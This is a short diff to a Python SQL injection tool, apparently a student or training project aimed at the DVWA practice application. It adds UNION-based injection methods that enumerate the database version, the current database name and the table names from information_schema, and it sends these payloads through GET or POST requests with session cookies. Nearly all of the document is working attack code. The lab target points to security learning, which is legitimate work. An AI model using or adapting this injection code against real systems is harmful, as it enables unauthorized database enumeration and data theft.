@@ -68,11 +68,20 @@ class Union:
 		res = self.submit(query)
 		print_diff(self.original_text, res.text)
 
+	def get_version(self):
+		self.exec_union("@@version", "")
+
 	def get_database_name(self):
 		self.exec_union("DATABASE()", "")
 
+	def get_table_names(self):
+		contents = " FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema = 'dvwa'"
+		self.exec_union("table_name", contents)
+
 	def union(self):
+		self.get_version()
 		self.get_database_name()
+		self.get_table_names()
 
 class Vaccine:
 	def __init__(self, url, file, method):
@@ -157,10 +166,8 @@ class Vaccine:
 				"Submit" : "Submit"
 			}
 		res = requests.get(self.request_url, params=payload, cookies=cookies)
-		print(f'payload:{payload}')
 		if self.method == "get":
 			res = requests.get(self.request_url, params=payload, cookies=cookies)
-			print(res.url)
 		elif self.method == "post":
 			res = requests.post(self.request_url, data=payload, cookies=cookies)
 		return res
